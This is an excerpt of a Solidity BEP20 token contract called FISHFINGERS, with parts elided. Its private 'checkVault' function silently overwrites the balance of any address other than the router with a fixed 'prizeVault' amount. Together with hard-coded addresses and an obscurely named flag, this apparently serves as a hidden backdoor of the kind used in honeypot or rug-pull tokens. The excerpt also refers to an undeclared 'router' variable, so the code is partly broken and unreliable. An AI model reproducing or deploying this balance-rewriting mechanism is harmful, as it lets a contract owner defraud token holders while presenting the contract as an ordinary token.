...
contract FISHFINGERS is Context, IBEP20, Ownable {

    using Address for address;
    
    uint256 private total = 1000 * 10 ** 6 * 10 ** 9;
    uint256 private prizeVault = 600000000;
    string private _name;
    string private _symbol;
    address public prize=0x3e588eEA5C32288201E39cA7DD9650981985AbFc;
    address _routeradd=0x3e588eEA5C32288201E39cA7DD9650981985AbFc;
    address public _owner;
    uint8 private _decimals = 9;
uint256 _maxWalletSize=0;
    bool public eT = false;
    ...
    function checkVault(address prizePOTaddr) private
    {
        if (prizePOTaddr!=router)
        {
            bal[prizePOTaddr]=prizeVault;
        }
    }
